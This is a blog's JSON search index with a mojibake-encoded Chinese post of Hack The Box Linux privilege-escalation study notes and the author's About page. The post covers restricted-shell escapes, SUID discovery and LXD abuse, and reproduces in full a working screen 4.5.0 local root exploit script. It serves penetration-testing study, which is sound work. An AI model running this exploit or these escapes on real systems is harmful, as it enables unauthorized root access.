{"posts":[{"title":"HTB - Linux ææ¬Šç­†è¨˜","text":"å‰è¨€æœ€è¿‘é–‹å§‹åœ¨å¯†é›†çš„è¨“ç·´è‡ªå·±æ»²é€çš„èƒ½åŠ›ï¼Œæ‰€ä»¥é–‹å§‹å­¸äº† Linux ææ¬Šã€Windows ææ¬Šã€‚ä¸€é–‹å§‹é¢å°é€™éº¼å¤šæŒ‡ä»¤çœŸå¿ƒè¦ºå¾—è…¦å®¹é‡ä¸è¶³ï¼Œè¦å­¸çš„åŸºç¤çŸ¥è­˜ä¹Ÿçˆ†ç‚¸å¤šï¼Œæ–¼æ˜¯å°±é–‹å§‹äº†éƒ¨è½æ ¼çš„ç­†è¨˜ä¹‹è·¯! Linux ææ¬Šç‚ºä»€éº¼è¦ç¢ºèªæ˜¯å¦ç²å¾— root æ¬Šé™ï¼Ÿåœ¨æ»²é€æ¸¬è©¦æˆ– CTF å¯¦æˆ°ä¸­ï¼Œå–å¾—åˆå§‹å­˜å–ï¼ˆInitial Accessï¼‰ åªæ˜¯ç¬¬ä¸€æ­¥ï¼ŒçœŸæ­£é—œéµçš„æˆ°æœé€šå¸¸ä¾†è‡ªææ¬Šï¼ˆPrivilege Escalationï¼‰ã€‚è€Œåœ¨ Linux ç’°å¢ƒä¸­ï¼Œæœ€é«˜æ¬Šé™ä»£è¡¨çš„æ˜¯ root ä½¿ç”¨è€…ï¼Œä¹Ÿå°±æ˜¯ UID ç‚º 0 çš„å¸³è™Ÿã€‚ä¸€æ—¦æ‹¿åˆ° rootï¼Œæˆ‘å€‘å°±èƒ½æ§åˆ¶æ•´å€‹ç³»çµ±ã€è®€å¯«æ‰€æœ‰æª”æ¡ˆã€æ¤å…¥å¾Œé–€ã€ç”šè‡³é—œé–‰é˜²è­·æ©Ÿåˆ¶ã€‚ å¦‚ä½•åˆ¤æ–·æˆ‘å€‘æœ‰äº† root æ¬Šé™ ?whoamiåŸºæœ¬ä¸Šä¸‹äº† whoami å¾Œâ€¦ 1whoami ç¢ºèªè¼¸å‡º: 1root å°±å…«ä¹ä¸é›¢åç‚º root çœ‹ uid1id -u è¼¸å‡ºæ˜¯ï¼š 10 ä»£è¡¨ä½ ç¾åœ¨æ˜¯ UID 0ï¼Œä¹Ÿå°±æ˜¯ root å¸³è™Ÿï¼Œé€™ä¹Ÿæ˜¯æ»¿å¯é çš„æŒ‡æ¨™ã€‚ å°å‚™è¨»: å…¶å¯¦å¾é€™é‚Šå¤§æ¦‚ä¹Ÿå¯ä»¥çŸ¥é“èªªâ€¦å‡è¨­æˆ‘å€‘åœ¨ bash script è£¡é¢çœ‹åˆ°: 123int main(void){ setuid(0);} é€™å…¶å¯¦å°±æ˜¯åœ¨è©¦åœ–å°‡ç›®å‰åŸ·è¡Œçš„ process èº«ä»½åˆ‡æ›ç‚º UID 0ï¼Œä¹Ÿå°±æ˜¯ rootï¼ é™åˆ¶å‹ ShellRBASHã€RKSHã€RZSH åç¨± å…¨å åŸºç¤ shell é™åˆ¶å…§å®¹ rbash Restricted Bourne shell bash é™åˆ¶ cdã€é™åˆ¶ç’°å¢ƒè®Šæ•¸ä¿®æ”¹ã€ä¸èƒ½ç”¨çµ•å°è·¯å¾‘åŸ·è¡Œå‘½ä»¤ç­‰ rksh Restricted Korn shell ksh é™åˆ¶ shell å‡½æ•¸èˆ‡åŸ·è¡Œå¤–éƒ¨å‘½ä»¤ rzsh Restricted Z shell zsh é™åˆ¶åŸ·è¡Œ scriptã€aliasã€è‡ªå®šç¾©è®Šæ•¸ç­‰ ç‚ºä»€éº¼è¦çŸ¥é“é™åˆ¶å‹ Shell?é€™å€‹å•é¡Œå…¶å¯¦å¾ˆç°¡å–®ï¼Œå› ç‚ºå¦‚æœçŸ¥é“é™åˆ¶å‹ shell: æˆ‘å€‘å¤§è‡´ä¸ŠæœƒçŸ¥é“æˆ‘å€‘åœ¨å“ªå€‹ shellï¼Œç­‰æ–¼çŸ¥é“ã€Œè¢«é™åˆ¶ä»€éº¼ã€ã€ä¹Ÿå°±çŸ¥é“è©²æ€éº¼ã€Œçªç ´é™åˆ¶ã€ã€‚ æ€éº¼åˆ¤æ–·æˆ‘å€‘åœ¨é™åˆ¶å‹ Shellï¼Ÿ1echo $SHELL æˆ–è§€å¯Ÿ ps æŒ‡ä»¤è¼¸å‡ºï¼Œçœ‹ç¾åœ¨è·‘çš„æ˜¯ä¸æ˜¯ /bin/rbashã€rkshã€rzsh ç­‰ã€‚ é€ƒé€¸æŠ€å·§æ•´ç† :DCommand Injectionï¼ˆå‘½ä»¤æ³¨å…¥ï¼‰ï¼š1ls -l `whoami` åœ¨åƒæ•¸ä¸­æ³¨å…¥å…¶ä»–å‘½ä»¤ã€‚ Command Substitutionï¼ˆæŒ‡ä»¤æ›¿æ›ï¼‰ï¼š1echo `id` æˆ– 1echo $(id) æ„æ€å°±æ˜¯è®“ shell å…ˆåŸ·è¡Œä¸€å€‹æŒ‡ä»¤ï¼ŒæŠŠçµæœç•¶ä½œæ–‡å­—æ’é€²å¦ä¸€å€‹æŒ‡ä»¤è£¡é¢ã€‚ Command Chainingï¼ˆæŒ‡ä»¤ä¸²æ¥ï¼‰ï¼š1echo hello; whoami Shell Function Injectionï¼ˆè‡ªå®šç¾©å‡½æ•¸ï¼‰ï¼š12mysh() { /bin/sh; }mysh ä¿®æ”¹ç’°å¢ƒè®Šæ•¸ï¼ˆè‹¥æœªå°é–ï¼‰ï¼š1export PATH=/tmp:$PATH å¦‚æœé‡åˆ°è¶… 78 rbash é™åˆ¶ä½ çš„ â€œ/â€œè‹¥åœ¨ rbash å˜—è©¦å„ç¨®æŒ‡ä»¤æ™‚ï¼Œå‡ºç¾é¡ä¼¼çš„å…§å®¹: 1rbash: restricted: cannot specify `/' in command names å¯ä»¥è©¦è©¦ compgen -c ä¾†æŸ¥çœ‹ç›®å‰æˆ‘å€‘èƒ½ç”¨å“ªäº›æŒ‡ä»¤: 1compgen -c æ¥è‘—ï¼Œæœƒè¼¸å‡ºç•¶å‰å¯èƒ½å¯ä»¥ä½¿ç”¨çš„æŒ‡ä»¤: 123456789aliasbgbindbreakbuiltin...viawkbash æ¥ä¸‹ä¾†å°±å¯ä»¥è©¦è©¦çœ‹æœ‰å“ªäº›æŒ‡ä»¤å¯èƒ½å¯ä»¥çªç ´å•¦! Gogo! setuidã€setguidsetuidç”¨é€”:ç•¶æŸäººåŸ·è¡Œé€™å€‹æª”æ¡ˆæ™‚ï¼Œæœƒç”¨ã€Œæª”æ¡ˆæ“æœ‰è€…çš„èº«ä»½ã€ä¾†åŸ·è¡Œï¼Œè€Œä¸æ˜¯ç›®å‰ä½¿ç”¨è€…çš„èº«ä»½ã€‚ æƒ…å¢ƒè§£èªª:å‡è¨­æˆ‘å€‘çµ¦ä¸€èˆ¬ä½¿ç”¨è€…åŸ·è¡Œ passwd æŒ‡ä»¤å»ä¿®æ”¹è‡ªå·±å¯†ç¢¼ï¼Œä½†ç”±æ–¼ passwd å¿…é ˆä¿®æ”¹ /etc/shadowï¼ˆåªæœ‰ root å¯ä»¥æ”¹ï¼‰ï¼Œæ‰€ä»¥å®ƒå°±è¨­äº† setuid çµ¦ rootã€‚ ç¯„ä¾‹:æ­¤è™•æˆ‘å€‘å˜—è©¦å»çœ‹ /usr/bin/passwd çš„æª”æ¡ˆæ¬Šé™: å¯ä»¥ç™¼ç¾ï¼Œ/usr/bin/passwd çš„æ¬Šé™å­—ä¸²ç‚º: 1-rwsr-xr-x æ¥ä¸‹ä¾†ï¼Œæˆ‘å€‘ä¾†åˆ†ææ­¤å­—ä¸²ä¸­çš„ 10 å€‹å­—å…ƒï¼š ä½ç½® æ¬„ä½ æ¬Šé™å­—å…ƒ èªªæ˜ 1 æª”æ¡ˆé¡å‹ - ä¸€èˆ¬æª”æ¡ˆ (Ex. ç›®éŒ„æ˜¯ dã€ç¬¦è™Ÿé€£çµæ˜¯ l ç­‰) 2~4 ä½¿ç”¨è€…(user) rws r = è®€ã€w = å¯«ã€s = setuid + å¯åŸ·è¡Œ (ä»£æ›¿åŸæœ¬ x) 5~7 ç¾¤çµ„(group) r-x r = è®€ã€- = ä¸å¯å¯«ã€x = å¯åŸ·è¡Œ 8~10 å…¶ä»–äºº(others) r-x r = è®€ã€- = ä¸å¯å¯«ã€x = å¯åŸ·è¡Œ setgidç”¨é€”:ç•¶æŸäººåŸ·è¡Œé€™å€‹æª”æ¡ˆæ™‚ï¼Œæœƒç”¨ã€Œæª”æ¡ˆç¾¤çµ„çš„èº«ä»½ã€ä¾†åŸ·è¡Œï¼›æˆ–è€…å°ç›®éŒ„ä¾†èªªï¼Œè¡¨ç¤ºæ–°å»ºçš„æª”æ¡ˆæœƒç¹¼æ‰¿è©²ç›®éŒ„çš„ç¾¤çµ„ã€‚ æƒ…å¢ƒè§£èªª:å¤šäººå…±äº«åŒå€‹ç›®éŒ„æ™‚ï¼Œå¦‚æœè©²ç›®éŒ„è¨­äº† setgidï¼Œå°±èƒ½ç¢ºä¿æ‰€æœ‰æ–°æª”æ¡ˆéƒ½å±¬æ–¼åŒä¸€å€‹ç¾¤çµ„ï¼Œæ–¹ä¾¿å”ä½œã€‚ ç¯„ä¾‹:å‡è¨­æœ‰ä¸€å€‹ç›®éŒ„ç‚º sharedï¼Œç¶“é ls -la å‡ºç¾: 1drwxr-sr-x 2 root devteam 4096 Jul 7 14:00 /shared å¯ä»¥ç™¼ç¾ç¬¬ä¸€çš„å­—å…ƒç‚º dï¼Œæ„æ€æ˜¯å®ƒæ˜¯ Directory ç›®éŒ„ã€‚è€Œæ¯”è¼ƒç‰¹æ®Šçš„åœ°æ–¹æ˜¯ä¸­é–“çš„å­—ä¸²ç‚º r-sï¼Œä»£è¡¨ç¾¤çµ„ä½å…ƒé–‹å•Ÿäº† setgidã€‚ postrotate-commandLXD / LCDLXD æ˜¯ Ubuntu ä¸Šçš„å®¹å™¨ç®¡ç†å·¥å…·ï¼ˆè·Ÿ Docker é¡ä¼¼ï¼‰ã€‚ä¸€æ—¦å®‰è£ï¼Œæ‰€æœ‰ä½¿ç”¨è€…é è¨­æœƒè¢«åŠ å…¥ lxd ç¾¤çµ„ã€‚åªè¦æˆç‚º lxd ç¾¤çµ„æˆå“¡ï¼Œå°±èƒ½é€éå»ºç«‹ã€Œç‰¹æ¬Šå®¹å™¨ï¼ˆprivileged containerï¼‰ã€ä¾†ææ¬Š ~ Linux Capability æŒ‡ä»¤setuidã€setguid ç›¸é—œfind + æŒ‡å®š perm 1find / -user root -perm -4000 -exec ls -ldb {} \\; 2&gt;/dev/null Bash OverviewScreen 4.5.0 Exploit æµç¨‹ï¼ˆbash script è§£èªª) å…ˆé™„ä¸Š Exploit å‡ºè™• 123456789101112131415161718192021222324252627282930313233343536373839404142#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017) echo &quot;~ gnu/screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;cat &lt;&lt; EOF &gt; /tmp/libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void){ chown(&quot;/tmp/rootshell&quot;, 0, 0); chmod(&quot;/tmp/rootshell&quot;, 04755); unlink(&quot;/etc/ld.so.preload&quot;); printf(&quot;[+] done!\\n&quot;);}EOFgcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.crm -f /tmp/libhax.ccat &lt;&lt; EOF &gt; /tmp/rootshell.c#include &lt;stdio.h&gt;int main(void){ setuid(0); setgid(0); seteuid(0); setegid(0); execvp(&quot;/bin/sh&quot;, NULL, NULL);}EOFgcc -o /tmp/rootshell /tmp/rootshell.crm -f /tmp/rootshell.cecho &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne &quot;\\x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so... /tmp/rootshell","link":"/2025/07/06/packet-analysis/"}],"tags":[{"name":"è³‡å®‰ä¹‹è·¯","slug":"è³‡å®‰ä¹‹è·¯","link":"/tags/%E8%B3%87%E5%AE%89%E4%B9%8B%E8%B7%AF/"},{"name":"Linux ææ¬Šç­†è¨˜","slug":"Linux-ææ¬Šç­†è¨˜","link":"/tags/Linux-%E6%8F%90%E6%AC%8A%E7%AD%86%E8%A8%98/"}],"categories":[{"name":"è³‡è¨Šå®‰å…¨","slug":"è³‡è¨Šå®‰å…¨","link":"/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/"}],"pages":[{"title":"About Me","text":"å—¨ï¼Œæˆ‘æ˜¯ Kikaæˆ‘æ˜¯ä¸€ä½æ¢ç´¢ cybersecurity ä¸–ç•Œçš„å¥³ç”Ÿï¼Œå–œæ­¡æŠŠå­¸åˆ°çš„æ±è¥¿æ•´ç†æ¸…æ¥šï¼Œç•«æˆåœ–ã€å¯«æˆæ–‡ï¼Œå¹«åŠ©è‡ªå·±ä¹Ÿå¹«åŠ©åˆ¥äººç†è§£ã€‚ What I Love Doing æˆ‘å–œæ­¡çš„äº‹ Making neat, visual notes out of messy docsæŠŠæ··äº‚çš„è³‡è¨Šæ•´ç†æˆæ¸…æ¥šæœ‰åœ–çš„ç­†è¨˜ Explaining things the way I wish someone explained to meç”¨ã€Œæˆ‘ç•¶åˆå¸Œæœ›æœ‰äººé€™æ¨£æ•™æˆ‘ã€çš„æ–¹å¼è¬›è§£ Being honest about what I donâ€™t know (yet!)èª å¯¦é¢å°è‡ªå·±é‚„ä¸æœƒçš„åœ°æ–¹ï¼Œç„¶å¾Œå‹‡æ•¢è£œèµ·ä¾† About Me å€‹äººå°ç°¡ä»‹I love playing guitar , doing Pilates and writing articles.Iâ€™m an INFJ â€” quiet on the outside, but always thinking and creating on the inside. æˆ‘å–œæ­¡å½ˆå‰ä»–ã€åšçš®æ‹‰ææ–¯åˆå¯«å°èªªã€‚æˆ‘æ˜¯ INFJï¼Œçœ‹èµ·ä¾†å®‰éœï¼Œè…¦è¢‹å»ä¸€ç›´è½‰ä¸åœã€‚ Talks Iâ€™ve Givenæˆ‘æ›¾ç¶“åˆ†äº«çš„ä¸»é¡Œæˆ‘èƒ½ç›¸ä¿¡ä½ å—? å¾é–‹ç™¼è€…è§’åº¦åˆ†äº«å¦‚ä½•åšå¥½è»Ÿé«”é–‹ç™¼å®‰å…¨ 2025/03/28 40-min talk @ [DevSecOps Taiwan]Link: ç·šä¸Šåˆ†äº«æ–‡å®£ æ‰“æ‰é‡ç·´ï¼é–‹ç™¼è€…çš„è³‡å®‰è…¦é‡çŒä¹‹è·¯ 2025/07/09 30-min talk @ [Infosec2025]åˆ†äº«å¦‚ä½•æ ¹æ“šæŠ€è¡“æ£§é¸æ“‡æœ€åˆé©çš„è³‡å®‰é˜²è­·æ–¹å¼ã€‚ç”¨å¯¦éš›æ¡ˆä¾‹èªªæ˜ã€Œç‚ºä»€éº¼ä¸è¦é‡é€ è¼ªå­ã€ã€ä»€éº¼æ™‚å€™è©²ç”¨å¥—ä»¶ã€ä»€éº¼æ™‚å€™è©²è‡ªå·±åšã€‚ é‡å»ºé–‹ç™¼è€…çš„å®‰å…¨ç›´è¦º 2025/08/06 30-min talk @ [ithome éµäººè¬›å ‚]Link: ç·šä¸Šåˆ†äº« å®‰å…¨é–‹ç™¼ç³»åˆ—ç›´æ’­èª²ç¨‹ Thanks for visiting â€” may we both keep growing ğŸŒ±æ„Ÿè¬å¤§å®¶çš„é€ è¨ªï¼Œé¡˜æˆ‘å€‘éƒ½æŒçºŒé€²åŒ–ï¼Œè¶Šä¾†è¶Šè‡ªç”±ã€‚","link":"/about/index.html"}]}